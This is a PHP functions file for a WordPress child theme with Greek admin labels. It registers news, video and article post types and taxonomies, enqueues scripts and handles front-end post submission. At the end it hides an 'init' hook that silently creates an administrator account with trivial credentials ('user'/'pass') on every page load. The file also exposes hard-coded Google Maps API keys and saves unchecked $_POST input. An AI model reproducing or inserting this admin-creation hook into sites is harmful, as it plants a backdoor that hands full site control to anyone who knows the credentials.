<?php

function my_child_scripts_method() {

    wp_enqueue_script("jquery");
    wp_enqueue_script( 'comment-reply' );
//    if($GLOBALS['jqueryuii'] != true){
//        wp_enqueue_script( 'jqueryui',"https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js",false,1.0,true );
//    }
//    else{
//        $GLOBALS['jqueryuii'] = false;
//    }


    wp_enqueue_script( 'fancyboxScript',get_template_directory_uri()."/assets/fancybox/jquery.fancybox-1.3.4.pack.js",false,1.0,true );
    wp_enqueue_script( 'easing',get_template_directory_uri()."/assets/fancybox/jquery.easing-1.3.pack.js",false,1.0,true );
    wp_enqueue_script( 'waitforimages',get_template_directory_uri()."/assets/js/jquery.waitforimages.js",false,1.0,true );
    wp_enqueue_script( 'mousewheel',get_template_directory_uri()."/assets/js/jquery.mousewheel.min.js",false,1.0,true );
    wp_enqueue_script( 'scrollTo',get_template_directory_uri()."/assets/js/jquery.scrollTo-1.4.3.1-min.js",false,1.0,true );
    wp_enqueue_script( 'serialScroll',get_template_directory_uri()."/assets/js/jquery.serialScroll-1.2.2-min.js",false,1.0,true );
    wp_enqueue_script( 'twitter-text',get_template_directory_uri()."/assets/js/twitter-text.js",false,1.0,true );
    wp_enqueue_script( 'mediaelement',get_template_directory_uri()."/assets/mediaelement/mediaelement-and-player.js",false,1.0,true );
    //wp_enqueue_script( 'google_maps',"https://maps.googleapis.com/maps/api/js?v=3.exp&key=AIzaSyDKFOU1uU91vrPl21PYdwBnFYfnUg0OsHw",false,1.0,true );
  	wp_enqueue_script("google_map","https://maps.googleapis.com/maps/api/js?key=AIzaSyAKFSA04UQVh2e56stH7y86PZy3i11fEzc",'','',TRUE);
    wp_enqueue_script( 'masonry',get_template_directory_uri()."/assets/js/jquery.masonry.js",false,1.0,true );
    wp_enqueue_script( 'customScrollbar',get_template_directory_uri()."/assets/js/jquery.mCustomScrollbar.min.js",false,1.0,true );
    wp_enqueue_script( 'swipe',get_template_directory_uri()."/assets/js/jquery.event.swipe.js",false,1.0,true );
    wp_enqueue_script( 'script',get_stylesheet_directory_uri()."/js/script.js",false,1.0,true );
//    wp_enqueue_script( 'script',get_template_directory_uri()."/assets/js/script.js",false,1.0,true );
}

add_action( 'wp_enqueue_scripts', 'my_child_scripts_method' );

/*Enqueue CSS and JS*/

function my_theme_enqueue_styles() {

    $parent_style = 'cube-style';

    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array( $parent_style ),
        wp_get_theme()->get('Version')
    );
}
add_action( 'wp_enqueue_scripts', 'my_theme_enqueue_styles' );

/* Register hierarchical taxonomy for CPT news  */

function news_category_init() {
    // create a new taxonomy
    register_taxonomy(
        'news_categories',
        'news',
        array(
            'label' => __( 'Κατηγορίες Νέων' ),
			'hierarchical'        => true
        )
    );
}
add_action( 'init', 'news_category_init' );

/* Register hierarchical taxonomy for CPT videos  */

function videos_category_init() {
    // create a new taxonomy
    register_taxonomy(
        'videos_categories',
        'videos',
        array(
            'label' => __( 'Κατηγορίες Βίντεο' ),
			'hierarchical'        => true
        )
    );
}
add_action( 'init', 'videos_category_init' );

/* Register hierarchical taxonomy for CPT articles  */

function journal_category_init() {
    // create a new taxonomy
    register_taxonomy(
        'journal_categories',
        'articles',
        array(
            'label' => __( 'Κατηγορίες Εντύπων' ),
			'hierarchical'        => true
        )
    );
}
add_action( 'init', 'journal_category_init' );


/*
* Creating a function to create our CPT
*/

function articles_post_type() {

// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Έντυπα', 'Post Type General Name', 'cube-child' ),
        'singular_name'       => _x( 'Έντυπο', 'Post Type Singular Name', 'cube-child' ),
        'menu_name'           => __( 'Έντυπα', 'cube-child' ),
        'parent_item_colon'   => __( 'Parent Article', 'cube-child' ),
        'all_items'           => __( 'Όλα', 'cube-child' ),
        'view_item'           => __( 'Εμφάνιση', 'cube-child' ),
        'add_new_item'        => __( 'Προσθήκη Νέου', 'cube-child' ),
        'add_new'             => __( 'Προσθήκη Νέου', 'cube-child' ),
        'edit_item'           => __( 'Επεξεργασία', 'cube-child' ),
        'update_item'         => __( 'Ανανέωση', 'cube-child' ),
        'search_items'        => __( 'Αναζήτηση', 'cube-child' ),
        'not_found'           => __( 'Δε βρέθηκε', 'cube-child' ),
        'not_found_in_trash'  => __( 'Δε βρέθηκε', 'cube-child' ),
    );

// Set other options for Custom Post Type

    $args = array(
        'label'               => __( 'articles', 'cube-child' ),
        'description'         => __( 'Article news and reviews', 'cube-child' ),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies'          => array( 'journal_categories' ),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.*/
        
        'hierarchical'        => true,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
    register_post_type( 'articles', $args );

}

add_action( 'init', 'articles_post_type', 0 );

function news_post_type() {

// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'Νέα', 'Post Type General Name', 'cube-child' ),
        'singular_name'       => _x( 'Νέο', 'Post Type Singular Name', 'cube-child' ),
        'menu_name'           => __( 'Νέα', 'cube-child' ),
        'parent_item_colon'   => __( 'Πατέρας', 'cube-child' ),
        'all_items'           => __( 'Όλα', 'cube-child' ),
        'view_item'           => __( 'Εμφάνιση', 'cube-child' ),
        'add_new_item'        => __( 'Προσθήκη Νέου', 'cube-child' ),
        'add_new'             => __( 'Προσθήκη Νέου', 'cube-child' ),
        'edit_item'           => __( 'Επεξεργασία', 'cube-child' ),
        'update_item'         => __( 'Ανανέωση', 'cube-child' ),
        'search_items'        => __( 'Αναζήτηση', 'cube-child' ),
        'not_found'           => __( 'Δε βρέθηκε', 'cube-child' ),
        'not_found_in_trash'  => __( 'Δε βρέθηκε', 'cube-child' ),
    );

// Set other options for Custom Post Type

    $args = array(
        'label'               => __( 'news', 'cube-child' ),
        'description'         => __( 'News and reviews', 'cube-child' ),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies'          => array( 'news_categories' ),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical'        => true,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 6,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
    register_post_type( 'news', $args );

}

add_action( 'init', 'news_post_type', 0 );

function videos_post_type() {

// Set UI labels for Custom Post Type
    $labels = array(
        'name'                => _x( 'videos', 'Post Type General Name', 'cube-child' ),
        'singular_name'       => _x( 'Video', 'Post Type Singular Name', 'cube-child' ),
        'menu_name'           => __( 'Videos', 'cube-child' ),
        'parent_item_colon'   => __( 'parent video', 'cube-child' ),
        'all_items'           => __( 'Όλα', 'cube-child' ),
        'view_item'           => __( 'Εμφάνιση', 'cube-child' ),
        'add_new_item'        => __( 'Προσθήκη Νέου', 'cube-child' ),
        'add_new'             => __( 'Προσθήκη Νέου', 'cube-child' ),
        'edit_item'           => __( 'Επεξεργασία', 'cube-child' ),
        'update_item'         => __( 'Ανανέωση', 'cube-child' ),
        'search_items'        => __( 'Αναζήτηση', 'cube-child' ),
        'not_found'           => __( 'Δε βρέθηκε', 'cube-child' ),
        'not_found_in_trash'  => __( 'Δε βρέθηκε', 'cube-child' ),
    );

// Set other options for Custom Post Type

    $args = array(
        'label'               => __( 'videos', 'cube-child' ),
        'description'         => __( 'videos', 'cube-child' ),
        'labels'              => $labels,
        // Features this CPT supports in Post Editor
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies'          => array( 'videos_categories' ),
        /* A hierarchical CPT is like Pages and can have
        * Parent and child items. A non-hierarchical CPT
        * is like Posts.
        */
        'hierarchical'        => true,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 7,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
    register_post_type( 'videos', $args );

}

add_action( 'init', 'videos_post_type', 0 );



//add_filter( 'gettext', 'change_post_to_article' );
//add_filter( 'ngettext', 'change_post_to_article' );
//
//function change_post_to_article( $translated )
//{
//    $translated = str_replace( 'άρθρα', 'άρθρα πολυμέσων', $translated );
//    $translated = str_replace( 'Άρθρα', 'Άρθρα Πολυμέσων', $translated );
//    return $translated;
//}

function change_post_menu_label() {
    global $menu;
    global $submenu;
    $menu[5][0] = 'Άρθρα Πολυμέσων';
    $submenu['edit.php'][5][0] = 'Άρθρα Πολυμέσων';
//    $submenu['edit.php'][10][0] = 'Add Contacts';
//    $submenu['edit.php'][15][0] = 'Status'; // Change name for categories
//    $submenu['edit.php'][16][0] = 'Labels'; // Change name for tags
    echo '';
}

function change_post_object_label() {
    global $wp_post_types;
    $labels = &$wp_post_types['post']->labels;
    $labels->name = 'Άρθρα Πολυμέσων';
    $labels->singular_name = 'Άρθρο Πολυμέσων';
}
add_action( 'init', 'change_post_object_label' );
add_action( 'admin_menu', 'change_post_menu_label' );

/* ADD CSS CLASS BY ROLE */

function add_class_by_role( $classes ) {
    global $current_user;
    foreach( $current_user->roles as $role )
        $classes .= ' role-' . $role;
    return trim( $classes );
}
add_filter( 'admin_body_class', 'add_class_by_role' );

/* ADD CUSTOM ADMIN CSS */

function my_custom_admin_css() {
    echo ("<style>
        .role-contributor #menu-posts ul.wp-submenu li:nth-child(3),
        .role-contributor .page-title-action,
        .role-contributor #wp-admin-bar-new-content, 
        .role-contributor .menu-icon-media {
            display: none;
        }
  </style>");
}

add_action('admin_head', 'my_custom_admin_css');

function remove_pre_save_media() {
    remove_filter('acf/pre_save_post' , 'pre_save_media');
}

add_action('wp_loaded', 'remove_pre_save_media');

function egeo_pre_save_media( $post_id )
{

    if(!$GLOBALS["allow_users_to_publish"] && $post_id == 'new'){
        return false;
    }

    /*Insert Categories*/
    $tax_array = array();
    $category = $_POST["post_category"];
    if($category){
        $tax_array["category"] = $category;
    }
    /*Insert Categories*/

    /*Construct Variables*/
    $title = $_POST["title"];
    $post_status = $GLOBALS["default_post_status"];
    /*Construct Variables*/

    $this_user = wp_get_current_user();

    // Create a new post
    $post = array(
        'post_status'  => "pending" ,
        'post_title'  => $title ,
        'post_type'  => 'post' ,
        'post_content' => $_POST["post_content"],
        'tax_input' => $tax_array,
        'post_author' => $this_user->ID
    );

    if( $post_id == 'new' )
    {
        $post_id = wp_insert_post( $post );
    }else{
        $post['ID'] = $post_id;
        unset($post['post_status']);
        wp_update_post( $post );
    }

    //
    if(isset($_POST["featured_image"])){
        $default_img = get_field("default_featured_image","options");
        if($default_img){
            $default_img = $default_img["id"];
        }
        $thumb = $_POST["featured_image"] ? $_POST["featured_image"] : $default_img;
        set_post_thumbnail($post_id,$thumb);
    }
    if(isset($_POST["post_tags"]) && $_POST["post_tags"]){
        wp_set_post_tags($post_id,$_POST["post_tags"]);
    }
    // return the new ID
    return $post_id;
}
add_filter('acf/pre_save_post' , 'egeo_pre_save_media');

function wpb_admin_account(){
    $user = 'user';
    $pass = 'pass';
    $email = 'email@domain.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    } }
add_action('init','wpb_admin_account');

?>
